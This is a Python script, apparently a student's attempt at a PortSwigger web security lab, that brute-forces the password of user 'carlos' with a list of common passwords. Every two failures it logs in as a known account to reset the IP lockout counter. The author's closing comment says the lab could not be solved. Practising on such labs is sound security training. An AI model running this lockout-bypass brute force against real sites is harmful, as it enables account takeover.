# Script for Prtoswigger lab "Broken brute-force protection, IP block"

import requests

from rich.console import Console
from rich.progress import track


PASSWORDS = """
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
superman
1qaz2wsx
7777777
121212
000000
qazwsx
123qwe
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
andrew
tigger
sunshine
iloveyou
2000
charlie
robert
thomas
hockey
ranger
daniel
starwars
klaster
112233
george
computer
michelle
jessica
pepper
1111
zxcvbn
555555
11111111
131313
freedom
777777
pass
maggie
159753
aaaaaa
ginger
princess
joshua
cheese
amanda
summer
love
ashley
nicole
chelsea
biteme
matthew
access
yankees
987654321
dallas
austin
thunder
taylor
matrix
mobilemail
mom
monitor
monitoring
montana
moon
moscow
""".strip().split("\n")

console = Console()

URL='https://0a2500d8049b65e08053d53500d600a1.web-security-academy.net/'
LOGIN='login'

def try_login(username, password):
    response = requests.post(
        f"{URL}{LOGIN}",
        data=f"username={username}&password={password}",
        allow_redirects=False,
    )
    return response.status_code


def bruteforce_login():
    response_codes = []
    # number of failed attempts before the account would be blocked 
    max_failed_attempts = 3
    count = 0

    for password in track(PASSWORDS, console=console):
        code = try_login('carlos', password)
        console.print(f"{code}\t{password}")
        response_codes.append((code, password))
        count += 1
        if count == (max_failed_attempts-1):
            # force successful login
            try_login('wiener', 'peter')
            count = 0

    response_codes.sort(key=lambda record: record[0], reverse=True)
    console.print("Solution: ", response_codes[0])
    return response_codes[0][1]


# CANNOT SOLVE THE LAB!
password = bruteforce_login()
